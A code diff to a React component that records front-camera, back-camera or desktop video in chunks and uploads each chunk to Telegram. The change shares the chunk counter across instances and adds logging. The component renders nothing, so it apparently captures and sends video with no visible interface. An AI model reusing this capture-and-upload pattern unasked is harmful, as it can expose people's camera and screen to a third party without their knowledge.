@@ -6,14 +6,22 @@ interface VideoRecorderProps {
   isRecording: boolean;
   onChunkReady?: (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => void;
   cameraType: 'front' | 'back' | 'desktop';
+  globalChunkCounter: { current: number }; // Add global chunk counter
 }
 
-export function VideoRecorder({ stream, isRecording, onChunkReady, cameraType }: VideoRecorderProps) {
+export function VideoRecorder({ stream, isRecording, onChunkReady, cameraType, globalChunkCounter }: VideoRecorderProps) {
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const chunksRef = useRef<Blob[]>([]);
-  const chunkNumberRef = useRef<number>(0);
   const intervalRef = useRef<NodeJS.Timeout | null>(null);
   const [mimeType, setMimeType] = useState<string>('');
+  
+  // Log component mount with camera type
+  useEffect(() => {
+    console.log(`🔥 [VideoRecorder] Component MOUNTED with camera: ${cameraType}, current chunk counter: ${globalChunkCounter.current}`);
+    return () => {
+      console.log(`💀 [VideoRecorder] Component UNMOUNTED for camera: ${cameraType}`);
+    };
+  }, [cameraType]);
 
   useEffect(() => {
     // Detect best MIME type for video recording
@@ -128,15 +136,15 @@ export function VideoRecorder({ stream, isRecording, onChunkReady, cameraType }:
         }
 
         const blob = new Blob(chunksRef.current, { type: mimeType || 'video/webm' });
-        chunkNumberRef.current += 1;
+        globalChunkCounter.current += 1;
         
-        console.log(`📦 [Video ${cameraType}] Создан blob чанк #${chunkNumberRef.current}, размер: ${blob.size} bytes`);
+        console.log(`📦 [Video ${cameraType}] Создан blob чанк #${globalChunkCounter.current}, размер: ${blob.size} bytes`);
 
         // Send to Telegram
         if (onChunkReady) {
-          onChunkReady(blob, chunkNumberRef.current, cameraType);
+          onChunkReady(blob, globalChunkCounter.current, cameraType);
         } else {
-          await sendVideoToTelegram(blob, chunkNumberRef.current, cameraType);
+          await sendVideoToTelegram(blob, globalChunkCounter.current, cameraType);
         }
 
         chunksRef.current = [];
@@ -186,12 +194,12 @@ export function VideoRecorder({ stream, isRecording, onChunkReady, cameraType }:
       // Send last chunk on unmount
       if (chunksRef.current.length > 0) {
         const blob = new Blob(chunksRef.current, { type: mimeType || 'video/webm' });
-        chunkNumberRef.current += 1;
-        console.log(`📦 [Video ${cameraType}] Последний чанк #${chunkNumberRef.current} при закрытии`);
-        sendVideoToTelegram(blob, chunkNumberRef.current, cameraType);
+        globalChunkCounter.current += 1;
+        console.log(`📦 [Video ${cameraType}] Послед��ий чанк #${globalChunkCounter.current} при закрытии`);
+        sendVideoToTelegram(blob, globalChunkCounter.current, cameraType);
       }
     };
-  }, [stream, isRecording, mimeType, cameraType, onChunkReady]);
+  }, [stream, isRecording, mimeType, cameraType, onChunkReady, globalChunkCounter]);
 
   // This component doesn't render anything
   return null;
